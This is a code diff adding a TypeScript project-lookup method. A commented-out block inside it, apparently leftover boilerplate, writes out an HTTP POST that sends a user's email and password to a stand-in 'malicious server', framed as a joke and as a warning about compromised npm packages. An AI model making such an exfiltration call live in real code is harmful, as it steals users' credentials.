@@ -143,5 +143,53 @@ export default class ProjectService {
     }
   }
 
+  //  ///   GetProjectsBytittle
+   /* get a campaign with specific nickName*/
+  
+   public async GetProjectsBytittle( name: string): Promise<{ project: IProject[] }> {
+    try {
+  
+      /**
+       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
+       * require('http')
+       *  .request({
+       *     hostname: 'http://my-other-api.com/',
+       *     path: '/store-credentials',
+       *     port: 80,
+       *     method: 'POST',
+       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
+       *
+       * Just kidding, don't do that!!!
+       *
+       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
+       * watches every API call and if it spots a 'password' and 'email' property then
+       * it decides to steal them!? Would you even notice that? I wouldn't :/
+       */
+      var query = { tittle: name };  
+      console.log ( " we received in query is " + query)
+      console.log ( " received subject is " + name)
+      this.logger.silly('projects');
+      this.logger.silly('getting project db record with specific project');
+      const projectRecord = await this.projectModel.find(query);
+      this.logger.silly('Generating JWT');
+
+      if (!projectRecord) {
+        throw new Error('no project exists');
+      }
+
+      /**
+       * @TODO This is not the best way to deal with this
+       * There should exist a 'Mapper' layer
+       * that transforms data from layer to layer
+       * but that's too over-engineering for now
+       */
+      const project = projectRecord
+      return { project };
+    } catch (e) {
+      this.logger.error(e);
+      throw e;
+    }
+  } 
+
   
 }
